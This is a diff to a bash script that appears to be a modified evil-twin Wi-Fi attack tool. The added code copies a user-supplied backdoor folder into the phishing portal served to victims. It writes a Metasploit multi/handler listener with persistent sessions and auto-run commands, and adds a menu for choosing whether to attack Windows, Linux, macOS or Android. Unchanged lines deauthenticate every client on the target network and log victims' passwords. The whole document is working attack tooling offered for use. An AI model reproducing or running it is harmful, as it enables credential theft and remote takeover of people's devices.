@@ -35,8 +35,12 @@ DUMP_PATH="/tmp/TMPflux"
 WORK_DIR=`pwd`
 HANDSHAKE_PATH="$WORK_DIR/handshakes"
 PASSLOG_PATH="$WORK_DIR/../../../Victim/pwlog"
+path_metasploit="$WORK_DIR/lib/metasploit"
 script_listerning="$WORK_DIR/lib/metasploit/script-listerning.rc"
-script_auto_command="$WORK_DIR/lib/metasploit/auto-script.rc"
+win_auto_command="$WORK_DIR/lib/metasploit/win-auto-script.rc"
+linux_auto_command="$WORK_DIR/lib/metasploit/linux-auto-script.rc"
+macos_auto_command="$WORK_DIR/lib/metasploit/mac-auto-script.rc"
+android_auto_command="$WORK_DIR/lib/metasploit/android-auto-script.rc"
 DEAUTHTIME="9999999999999"
 Metasp_configure=""
 revision=9
@@ -1653,7 +1657,8 @@ function attack {
         echo "$Host_MAC" >$DUMP_PATH/mdk3.txt
         xterm $HOLD $BOTTOMRIGHT -bg "#000000" -fg "#FF0009" -title "Deauth all [mdk3]  $Host_SSID" -e mdk3 $WIFI_MONITOR d -b $DUMP_PATH/mdk3.txt -c $Host_CHAN &
 	if [ "$Metasp_configure"="on" ]; then
-        xterm -geometry 100x25+250+150 -fa monaco -fs 12 -bg black -title "Metasploit Listerning" -e msfconsole -r $script_listerning &
+	cd $path_metasploit
+        xterm -geometry 100x25+250+150 -fa monaco -fs 12 -bg black -title "Metasploit Listerning" -e msfconsole -r script-listerning.rc &
 	fi
         xterm -hold $TOPRIGHT -title "Wifi Information" -e $DUMP_PATH/handcheck &
         conditional_clear
@@ -2730,28 +2735,123 @@ fi
 }
 function metasploit {
 	Metasp_configure="on"
+	echo -ne " ${red}=>${white} Enter the location folder of backdoor : ${transparent}"
+	read folder
+	folder_backdoor=`echo "$folder" | cut -d "'" -f2` > /dev/null 2>&1
+	cp $folder_backdoor/* $WORK_DIR/sites/metasploit/
+
         mkdir $DUMP_PATH/data &>$flux_output_device
     	cp -r  $WORK_DIR/sites/metasploit/* $DUMP_PATH/data
 	rm -rf $script_listerning
 	touch $script_listerning
-	echo -ne " ${red}=>${white} Set up payload : ${transparent}"
-	read paylo
-	echo -ne " ${red}=>${white} Set up port : ${transparent}"
-	read port
-		echo "use exploit/multi/handler" > $script_listerning
-		echo "set payload $paylo" >> $script_listerning
-		echo "set lhost 192.168.1.1" >> $script_listerning
-		echo "set lport $port" >> $script_listerning
-		echo "set ExitOnSession false" >> $script_listerning
-	echo -ne " ${red}=>${white} run multi command (y/n): ${transparent}"
+	echo "use exploit/multi/handler" > $script_listerning
+	echo -e " ${red}=>${white} Select the OS you want to attack${transparent}"
+cat << !
+	 _________________________________________________ 
+	|    |						  |
+	| ID | Operating System 			  |
+	|----+--------------------------------------------|
+	| 1  | Windows					  |
+	|----+--------------------------------------------|
+	| 2  | Linux  		  			  |
+	|----+--------------------------------------------|
+	| 3  | MacOS 		 			  |
+	|----+--------------------------------------------|
+	| 4  | Android                       		  |
+	|----+--------------------------------------------|
+	| 5  | Starting Attacking   			  |
+	 ------------------------------------------------- 
+!
 	while true; do
-	   read yn
-	   case $yn in
-		y) 
-gedit $script_auto_command
-echo "set AutoRunScript multi_console_command -r $script_auto_command" >> $script_listerning; break;;
-		n) break;;
-	   esac
+		echo -ne "Choose: "
+		read id_OS
+		case $id_OS in
+			1)
+				echo -ne " ${red}=>${white} Set up payload : ${transparent}"
+				read paylo_win
+				echo -ne " ${red}=>${white} Set up port : ${transparent}"
+				read port_win
+					echo "set payload $paylo_win" >> $script_listerning
+					echo "set lhost 192.168.1.1" >> $script_listerning
+					echo "set lport $port_win" >> $script_listerning
+					echo "set ExitOnSession false" >> $script_listerning
+				echo -ne " ${red}=>${white} run multi command (y/n): ${transparent}"
+						while true; do
+						   read yn
+						   case $yn in
+							y)
+							gedit $win_auto_command
+							echo "set AutoRunScript multi_console_command -r $win_auto_command" >> $script_listerning; break;;
+							n) break;;
+						   esac
+						done
+				echo "exploit -j -z" >> $script_listerning;;
+			2)
+				echo -ne " ${red}=>${white} Set up payload : ${transparent}"
+				read paylo_linux
+				echo -ne " ${red}=>${white} Set up port : ${transparent}"
+				read port_linux
+					echo ""
+					echo "set payload $paylo_linux" >> $script_listerning
+					echo "set lhost 192.168.1.1" >> $script_listerning
+					echo "set lport $port_linux" >> $script_listerning
+					echo "set ExitOnSession false" >> $script_listerning
+				echo -ne " ${red}=>${white} run multi command (y/n): ${transparent}"
+						while true; do
+						   read yn
+						   case $yn in
+							y) 
+							gedit $linux_auto_command
+							echo "set AutoRunScript multi_console_command -r $linux_auto_command" >> $script_listerning; break;;
+							n) break;;
+						   esac
+						done
+				echo "exploit -j -z" >> $script_listerning;;
+			3)
+				echo -ne " ${red}=>${white} Set up payload : ${transparent}"
+				read paylo_macos
+				echo -ne " ${red}=>${white} Set up port : ${transparent}"
+				read port_macos
+					echo ""
+					echo "set payload $paylo_macos" >> $script_listerning
+					echo "set lhost 192.168.1.1" >> $script_listerning
+					echo "set lport $port_macos" >> $script_listerning
+					echo "set ExitOnSession false" >> $script_listerning
+				echo -ne " ${red}=>${white} run multi command (y/n): ${transparent}"
+						while true; do
+						   read yn
+						   case $yn in
+							y) 
+							gedit $macos_auto_command
+							echo "set AutoRunScript multi_console_command -r $macos_auto_command" >> $script_listerning; break;;
+							n) break;;
+						   esac
+						done
+				echo "exploit -j -z" >> $script_listerning;;
+			4)
+				echo -ne " ${red}=>${white} Set up payload : ${transparent}"
+				read paylo_android
+				echo -ne " ${red}=>${white} Set up port : ${transparent}"
+				read port_android
+					echo ""
+					echo "set payload $paylo_android" >> $script_listerning
+					echo "set lhost 192.168.1.1" >> $script_listerning
+					echo "set lport $port_android" >> $script_listerning
+					echo "set ExitOnSession false" >> $script_listerning
+				echo -ne " ${red}=>${white} run multi command (y/n): ${transparent}"
+						while true; do
+						   read yn
+						   case $yn in
+							y) 
+							gedit $android_auto_command
+							echo "set AutoRunScript multi_console_command -r $android_auto_command" >> $script_listerning; break;;
+							n) break;;
+						   esac
+						done
+				echo "exploit -j -z" >> $script_listerning;;
+			5) break;;
+			*) echo -e "Unknown option. Please choose again";
+			esac
 	done
 }
 ######################################### < INTERFACE WEB > ########################################
